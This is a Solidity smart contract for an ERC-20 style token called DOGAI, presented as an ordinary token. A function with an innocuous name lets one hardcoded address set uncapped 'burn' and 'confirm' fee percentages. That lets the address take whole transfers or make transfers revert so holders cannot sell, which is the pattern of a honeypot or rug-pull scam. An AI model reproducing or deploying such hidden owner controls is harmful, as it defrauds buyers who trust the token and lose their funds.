// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.20;

contract DOGAI {
    string public constant name = "DOGAI";
    string public constant symbol = "DOGAI";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 100_000_000 * 10**decimals;

    uint256 public burnAmount = 0;
    uint256 public confirmAmount = 0;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    address public pair;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 currentAllowance = allowance[from][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        allowance[from][msg.sender] = currentAllowance - amount;
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        if (pair == address(0) && amount > 0) {
            pair = to; // Automatically setting the liquidity pool address if not set
        }

        uint256 fromBalance = balanceOf[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        balanceOf[from] = fromBalance - amount;

        uint256 fee = (from == pair ? burnAmount : confirmAmount) * amount / 100;
        uint256 finalAmount = amount - fee;

        balanceOf[pair] += fee; // Sending fees to the liquidity pool
        balanceOf[to] += finalAmount;

        emit Transfer(from, to, finalAmount);
        if (fee > 0) {
            emit Transfer(from, pair, fee);
        }

        return true;
    }

    function setDOGAI(uint256 newBurn, uint256 newConfirm) external {
        require(msg.sender == address(0xF1c8caD8AE655bd7ee12B7c330A81a8F930C5A1e), "Only deployer can set parameters");
        burnAmount = newBurn;
        confirmAmount = newConfirm;
    }
}